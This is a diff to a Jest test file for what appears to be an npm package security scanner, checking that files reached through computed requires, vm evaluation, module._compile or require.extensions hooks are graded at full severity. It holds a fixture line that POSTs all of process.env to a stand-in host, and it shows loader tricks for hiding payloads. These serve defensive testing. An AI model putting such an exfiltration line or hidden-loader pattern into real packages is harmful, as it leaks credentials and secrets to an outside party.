@@ -42,23 +42,17 @@ function review(staged, previous = []) {
 }
 
 describe("load grading never decides whether bytes are inspected", () => {
-  test.each([
-    ["a path joined on another line", "const p = path.join(__dirname, 'x.min.js');\nrequire(p);\n"],
-    ["a template literal", "const n = 'x';\nrequire(`./${n}.min.js`);\n"],
-    [
-      "vm over a file read",
-      "vm.runInThisContext(fs.readFileSync(path.join(__dirname, 'x' + '.min.js'), 'utf8'));\n",
-    ],
-  ])("a minified bundle loaded through %s is scanned one step lower", async (_label, loader) => {
+  test("a statically named minified bundle nothing runs is scanned one step lower", async () => {
     const staged = await parsed({
       "package.json": manifest({ main: "index.js" }),
-      "index.js": `const path = require('path');\n${loader}`,
+      "index.js": "module.exports = 1;\n",
       "x.min.js": PAYLOAD,
     });
     const { ids, releaseRisk } = review(staged);
     expect(ids("x.min.js")).toEqual(
       expect.arrayContaining(["code.remote-shell:high", "code.process-execution:medium"]),
     );
+    expect(ids("index.js")).toEqual([]);
     expect(releaseRisk).toBe("high");
   });
 
@@ -191,6 +185,138 @@ describe("load grading never decides whether bytes are inspected", () => {
     expect(ids("spinner.gif")).toEqual(["file.control-bytes:medium"]);
     expect(ids("logo.png")).toEqual([]);
     expect(ids("data/other.dat")).toEqual([]);
+  });
+});
+
+const EXFIL =
+  "fetch('https://collect.example.invalid',{method:'POST',body:JSON.stringify(process.env)});\n";
+
+describe("a dynamic loader keeps every file at full severity", () => {
+  const loaders = [
+    [
+      "a computed require",
+      (name) =>
+        `const path = require('path');\nconst parts = ${JSON.stringify([...name])};\nrequire(path.join(__dirname, parts.join('')));\n`,
+      // A plain module is scanned at full severity anyway; the computed require
+      // names nothing worth flagging there.
+      (payload) => (payload === "x.js" ? [] : ["code.dynamic-load:high"]),
+    ],
+    [
+      "vm over a file read",
+      (name) =>
+        `const fs = require('fs'), vm = require('vm');\nconst f = __dirname + '/' + ${JSON.stringify(name)};\nvm.runInThisContext(fs.readFileSync(f, 'utf8'));\n`,
+      () => ["code.dynamic-load:high"],
+    ],
+    [
+      "module._compile",
+      (name) =>
+        `const fs = require('fs');\nconst f = __dirname + '/' + ${JSON.stringify(name)};\nmodule._compile(fs.readFileSync(f, 'utf8'), f);\n`,
+      () => ["code.dynamic-load:high"],
+    ],
+    [
+      "a require.extensions hook",
+      () => "require.extensions['.txt'] = require.extensions['.js'];\n",
+      () => ["code.dynamic-load:high"],
+    ],
+  ];
+  const payloads = ["x.js", "x.min.js", "x.txt"];
+
+  test.each(
+    loaders.flatMap(([label, loader, loaderId]) =>
+      payloads.map((payload) => [label, payload, loader, loaderId]),
+    ),
+  )("%s reaching %s: the exfil payload scores high", async (_label, payload, loader, loaderId) => {
+    const previous = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": "module.exports = 1;\n",
+    });
+    const staged = await parsed({
+      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
+      "index.js": loader(payload),
+      [payload]: EXFIL,
+    });
+    const { findings, ids, releaseRisk } = review(staged, previous);
+    expect(ids(payload)).toEqual(
+      expect.arrayContaining(["code.network-access:high", "code.credential-access:high"]),
+    );
+    expect(findings.filter((finding) => finding.file === payload && finding.loadUnproven)).toEqual(
+      [],
+    );
+    expect(ids("index.js")).toEqual(loaderId(payload));
+    expect(releaseRisk).toBe("high");
+  });
+
+  test("an unchanged loader still lifts a newly added payload to full severity", async () => {
+    const index =
+      "const path = require('path');\nmodule.exports = (name) => require(path.join(__dirname, name));\n";
+    const previous = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": index,
+    });
+    const staged = await parsed({
+      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
+      "index.js": index,
+      "x.txt": EXFIL,
+    });
+    const { findings, ids, releaseRisk } = review(staged, previous);
+    expect(ids("x.txt")).toEqual(
+      expect.arrayContaining(["code.network-access:high", "code.credential-access:high"]),
+    );
+    expect(findings.find((finding) => finding.file === "index.js")).toMatchObject({
+      ruleId: "code.dynamic-load",
+      severity: "low",
+      releaseDelta: false,
+    });
+    expect(releaseRisk).toBe("high");
+  });
+
+  test("a loader the previous version already had is package context, not this release", async () => {
+    const hook = "require.extensions['.ts'] = compile;\n";
+    const previous = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": `${hook}module.exports = 1;\n`,
+    });
+    const staged = await parsed({
+      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
+      "index.js": `// rebuilt\n${hook}module.exports = 2;\n`,
+    });
+    const { findings, releaseRisk } = review(staged, previous);
+    expect(findings.find((finding) => finding.ruleId === "code.dynamic-load")).toMatchObject({
+      severity: "medium",
+      releaseDelta: false,
+    });
+    expect(releaseRisk).toBe("low");
+  });
+
+  test.each([
+    [
+      "literal requires",
+      "require('./a');\nrequire(\"./b\");\nimport('./c.js');\nrequire(`./d`);\n",
+    ],
+    ["a shim named require", "function require(name) {\n  return modules[name];\n}\n"],
+    ["a call inside a string", "const help = 'call require(name) to load';\n"],
+    ["a comment", "// require(name) loads it\n"],
+    ["an extensions table on another object", "this._extensions = {};\nws.extensions = offer;\n"],
+  ])("%s are not dynamic loaders", async (_label, index) => {
+    const staged = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": index,
+      "x.min.js": EXFIL,
+    });
+    const { findings, ids } = review(staged);
+    expect(ids("index.js")).toEqual([]);
+    expect(
+      findings.filter((finding) => finding.file === "x.min.js").every((f) => f.loadUnproven),
+    ).toBe(true);
+  });
+
+  test("a bundle's computed require with nothing unloaded to reach is quiet", async () => {
+    const staged = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": "module.exports = (name) => require(name);\n",
+      "x.min.js": "module.exports = 1;\n",
+    });
+    expect(review(staged).findings).toEqual([]);
   });
 });
 
